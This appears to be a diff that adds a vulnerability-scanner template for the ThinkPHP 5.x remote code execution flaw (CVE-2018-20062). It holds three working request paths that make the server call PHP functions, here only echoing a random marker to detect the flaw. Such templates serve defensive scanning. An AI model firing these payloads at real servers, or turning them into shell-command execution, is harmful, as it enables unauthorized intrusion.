@@ -1,0 +1,24 @@
+id: thinkphp-rce
+info:
+  name: ThinkPHP 远程代码执行
+  severity: critical
+  description: ThinkPHP 5.x RCE 漏洞检测
+  tags: thinkphp,rce,php,critical
+  author: poxiao
+  classification:
+    cve-id: CVE-2018-20062
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=echo&vars[1][]={{randstr}}"
+      - "{{BaseURL}}/index.php?s=index/think\\request/input&filter[]=echo&data={{randstr}}"
+      - "{{BaseURL}}/?s=index/\\think\\Container/invokefunction&function=call_user_func_array&vars[0]=echo&vars[1][]={{randstr}}"
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "{{randstr}}"
+        part: body
+      - type: status
+        status: [200]
